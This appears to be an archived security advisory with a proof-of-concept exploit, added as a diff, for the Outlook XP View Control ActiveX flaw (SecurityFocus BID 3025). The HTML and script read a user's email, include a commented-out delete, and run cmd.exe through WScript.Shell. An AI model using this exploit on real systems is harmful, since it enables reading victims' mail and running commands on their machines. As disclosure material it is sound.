@@ -1,0 +1,37 @@
+source: http://www.securityfocus.com/bid/3025/info
+
+Microsoft Outlook introduces a vulnerability that may allow attackers to access and manipulate user email.
+
+The vulnerability is due to a new ActiveX control called 'Microsoft Outlook View Control'. The flaw is that this control is marked 'safe for scripting' when it should not be. It is therefore accessible by scripts.
+
+Scripts can access and perform operations on user email through this control without user knowledge or consent. 
+
+This assumes you have at least one message in Outlook XP's Inbox
+<br>
+<object id="o1"
+classid="clsid:0006F063-0000-0000-C000-000000000046"
+>
+<param name="folder" value="Inbox">
+</object>
+
+<script>
+function f()
+{
+//alert(o2.object);
+sel=o1.object.selection;
+vv1=sel.Item(1);
+alert("Subject="+vv1.Subject);
+alert("Body="+vv1.Body+"["+vv1.HTMLBody+"]");
+alert("May be deleted");
+//vv1.Delete();
+
+vv2=vv1.Session.Application.CreateObject("WScript.Shell");
+
+alert("Much more fun is possible");
+
+
+vv2.Run("C:\\WINNT\\SYSTEM32\\CMD.EXE /c DIR /A /P /S C:\\ ");
+
+}
+setTimeout("f()",2000);
+</script>
